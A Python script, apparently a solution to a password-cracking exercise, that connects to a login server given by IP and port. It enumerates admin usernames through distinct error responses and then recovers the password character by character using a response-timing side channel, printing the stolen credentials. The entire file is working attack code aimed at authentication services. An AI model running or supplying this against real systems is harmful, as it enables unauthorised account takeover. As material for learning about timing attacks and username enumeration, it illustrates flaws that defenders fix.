from sys import argv
from json import dumps, loads
from datetime import datetime, timedelta
import socket


def crack_user(sock: socket) -> str:
    # Define a list of common admin usernames.
    common_usernames = ['admin', 'Admin', 'admin1', 'admin2', 'admin3', 'user1', 'user2', 'root', 'default', 'new_user',
                        'some_user', 'new_admin', 'administrator', 'Administrator', 'superuser', 'super', 'su', 'alex',
                        'suser', 'rootuser', 'adminadmin', 'useruser', 'superadmin', 'username', 'username']

    # Attempt to login via the specified socket with each of the common admin usernames.
    for usr in common_usernames:
        # Create a dictionary of the current credentials being tested.
        credentials = {"login": usr, "password": " "}

        # Create a JSON string from the credentials, encode it and send it to the specified socket.
        sock.send(dumps(credentials).encode())

        # Decode the site's response, load a dictionary from that JSON string and retrieve the value paired with the
        # 'result' key.
        result = loads(sock.recv(1024).decode())['result']

        # If the result is 'Wrong password!', the correct username was found.
        if result == 'Wrong password!':
            return usr

    # If none of the common admin usernames are the correct one, raise an exception.
    raise AssertionError('Unable to determine admin username.')


def crack_password(sock: socket, user: str) -> str:
    # Create a dictionary object to maintain the current credentials being tested.
    credentials = {"login": user, "password": ""}

    # Create a list object to store the individual characters of the password.
    chars = []

    # Define the characters which a valid password is comprised of.
    valid_chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'

    # Iterate until either the correct password is returned or an exception is raised.
    while True:
        # Join the current password characters into a string that represents the prefix of the correct password.
        prefix = ''.join(chars)

        # Iterate through the valid password characters until another part of the password is found.
        for ch in valid_chars:
            # Update the value paired with the 'password' key in the credentials dictionary.
            credentials["password"] = prefix + ch

            # Store the current time before requesting the site's response.
            pre = datetime.now()

            # Create a JSON string from the credentials, encode it and send it to the specified socket.
            sock.send(dumps(credentials).encode())

            # Decode the site's response, load a dictionary from that JSON string and retrieve the value paired with the
            # 'result' key.
            result = loads(sock.recv(1024).decode())['result']

            # Store the current time after receiving the response from the site.
            post = datetime.now()

            # Calculate the time difference and determine if it is large enough to suggest that the current character is
            # a part of the password.
            diff = post - pre
            if diff >= timedelta(seconds=0.1):
                chars.append(ch)
                break

            # If the result is 'Connection success!', return the concatenation of the current prefix and character.
            if result == 'Connection success!':
                return prefix + ch

        # If this point is reached from all iterations of the nested for loop being completed and no new character being
        # found, raise an exception.
        if len(prefix) == len(chars):
            # If none of the common admin usernames are the correct one, raise an exception.
            raise AssertionError('Unable to determine admin password.')


# Store the IP address and port specified on the command line.
ip = argv[1]
port = int(argv[2])

# Create a socket object and connect to the specified ip and port.
my_socket = socket.socket()
my_socket.connect((ip, port))

# Create a dictionary to store the administrator's login credentials. Start by cracking their username.
login = {'login': crack_user(my_socket)}

# Crack the administrator's password and store it in the dictionary.
login['password'] = crack_password(my_socket, login['login'])

# Convert the dictionary object into a JSON string and print it.
print(dumps(login, indent=4))

# Close the socket.
my_socket.close()
